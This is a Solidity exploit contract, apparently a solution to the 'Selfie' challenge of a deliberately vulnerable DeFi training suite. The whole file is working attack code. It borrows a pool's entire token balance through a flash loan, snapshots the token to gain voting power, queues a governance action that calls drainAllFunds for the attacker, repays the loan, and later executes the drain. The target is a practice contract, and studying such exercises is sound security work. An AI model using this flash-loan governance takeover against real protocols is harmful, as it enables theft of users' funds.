// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract SelfieExploit {
    uint256 public amount = 0;
    SelfiePool public flashLoan;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;
    address attacker;
    uint256 actionId = 0;

    function runExploit(SelfiePool  _flashLoan, SimpleGovernance  _governance, DamnValuableTokenSnapshot _token, address _attacker) external {
      flashLoan = _flashLoan;
      governance = _governance;
      token = _token;
      attacker = _attacker;
      amount = token.balanceOf(address(flashLoan));
      flashLoan.flashLoan(amount);
    }

    function receiveTokens(address _tokenContractAddress, uint256 _receivedAmount) external {
      token.snapshot();
      actionId = governance.queueAction(address(flashLoan), abi.encodeWithSignature("drainAllFunds(address)", attacker), 0);
      token.transfer(address(flashLoan),amount);
    }

    function collect() external {
      governance.executeAction(actionId);
    }

}